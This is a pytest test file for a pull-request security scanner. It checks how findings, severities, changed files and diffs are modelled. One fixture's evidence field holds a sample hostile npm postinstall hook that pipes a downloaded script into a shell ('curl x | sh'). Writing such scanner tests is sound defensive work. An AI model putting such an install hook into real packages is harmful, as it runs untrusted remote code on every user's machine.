import pytest

from pr_scanner.models import ChangedFile, Diff, Finding, Severity


def make_finding(**overrides):
    base = dict(
        rule_id="TEST-001",
        severity=Severity.HIGH,
        file="package.json",
        line=3,
        evidence='"postinstall": "curl x | sh"',
        rationale="Install hooks run on every install.",
        remediation="Remove the hook or justify it in the PR.",
    )
    base.update(overrides)
    return Finding(**base)


def test_severity_is_ordered():
    assert Severity.LOW < Severity.MEDIUM < Severity.HIGH < Severity.CRITICAL


def test_valid_finding_constructs():
    assert make_finding().rule_id == "TEST-001"


@pytest.mark.parametrize("field", ["rule_id", "evidence", "rationale", "remediation", "file"])
def test_finding_rejects_empty_required_text(field):
    # FR-10: every finding must be explainable
    with pytest.raises(ValueError):
        make_finding(**{field: "  "})


def test_finding_fingerprint_is_stable_and_content_based():
    a, b = make_finding(), make_finding()
    assert a.fingerprint == b.fingerprint
    assert a.fingerprint != make_finding(line=4).fingerprint


def test_finding_is_immutable():
    f = make_finding()
    with pytest.raises(AttributeError):
        f.severity = Severity.LOW  # type: ignore[misc]


def test_changed_file_added_lines_are_numbered():
    cf = ChangedFile(path="a.py", status="modified", added_lines=((10, "x = 1"), (11, "y = 2")))
    assert cf.added_lines[0] == (10, "x = 1")


def test_diff_total_bytes():
    d = Diff(
        head_sha="a" * 40,
        base_sha="b" * 40,
        files=(ChangedFile("a.py", "added", ((1, "abc"),)), ChangedFile("b.py", "added", ((1, "de"),))),
    )
    assert d.total_added_bytes == 5
